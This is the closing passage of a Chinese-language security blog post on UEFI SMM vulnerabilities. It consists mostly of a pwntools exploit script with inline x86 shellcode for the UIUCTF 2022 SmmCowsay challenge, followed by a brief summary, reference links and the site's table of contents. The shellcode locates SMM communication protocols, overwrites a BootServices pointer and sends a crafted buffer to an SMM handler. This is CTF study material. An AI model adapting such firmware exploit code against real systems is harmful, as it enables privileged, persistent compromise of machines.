LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0x9d76f4b1548e0872ec86b7f3b31cf11e</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BootServices + <span class="number">320</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov qword ptr [rax], 0x5f9f080</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x40</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x28                             /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141               /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终效果如下：  </p>
<img src="/2024/12/14/uefi/28.png" class="" title="我的图图呢">  

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单学习了一下 UEFI SSM 的漏洞类型和攻击方式，对 UEFI 固件漏洞挖掘利用有了更加深刻的认识，找个时间再找些实际存在的漏洞实操一下😋。  </p>
<h2 id="学习的文章"><a href="#学习的文章" class="headerlink" title="学习的文章"></a>学习的文章</h2><p><a target="_blank" rel="noopener" href="https://xiananren.github.io/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://xiananren.github.io/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/17369864.html">https://www.cnblogs.com/L0g4n-blog/p/17369864.html</a><br><a target="_blank" rel="noopener" href="https://www.sentinelone.com/labs/zen-and-the-art-of-smm-bug-hunting-finding-mitigating-and-detecting-uefi-vulnerabilities/">https://www.sentinelone.com/labs/zen-and-the-art-of-smm-bug-hunting-finding-mitigating-and-detecting-uefi-vulnerabilities/</a><br><a target="_blank" rel="noopener" href="https://www.binarly.io/advisories/brly-2021-007">https://www.binarly.io/advisories/brly-2021-007</a><br><a target="_blank" rel="noopener" href="https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/">https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/</a><br><a target="_blank" rel="noopener" href="https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/">https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UEFI-SMM-%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">UEFI SMM 常见漏洞挖掘与利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">常见漏洞与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMM-Callouts"><span class="toc-number">2.2.1.</span> <span class="toc-text">SMM Callouts</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Low-SMRAM-Corruption"><span class="toc-number">2.2.2.</span> <span class="toc-text">Low SMRAM Corruption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Arbitrary-SMRAM-Corruption"><span class="toc-number">2.2.3.</span> <span class="toc-text">Arbitrary SMRAM Corruption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TOCTOU-attacks"><span class="toc-number">2.2.4.</span> <span class="toc-text">TOCTOU attacks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SetVariable-Information-Disclosure"><span class="toc-number">2.2.5.</span> <span class="toc-text">SetVariable() Information Disclosure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Double-GetVariable"><span class="toc-number">2.2.6.</span> <span class="toc-text">Double GetVariable()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%BF%9B%E8%A1%8C%E7%BB%83%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">通过一些题目进行练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UIUCTF-2022-SmmCowsay1"><span class="toc-number">3.1.</span> <span class="toc-text">UIUCTF 2022 SmmCowsay1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UIUCTF-2022-SmmCowsay2"><span class="toc-number">3.2.</span> <span class="toc-text">UIUCTF 2022 SmmCowsay2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DubheCTF-2024-ToySMM"><span class="toc-number">3.3.</span> <span class="toc-text">DubheCTF 2024 ToySMM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">学习的文章</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/12/14/uefi/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/12/14/uefi/&text=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/12/14/uefi/&is_video=false&description=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=UEFI SMM 漏洞挖掘与利用&body=Check out this article: https://qanux.github.io/2024/12/14/uefi/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/12/14/uefi/&name=UEFI SMM 漏洞挖掘与利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/12/14/uefi/&t=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
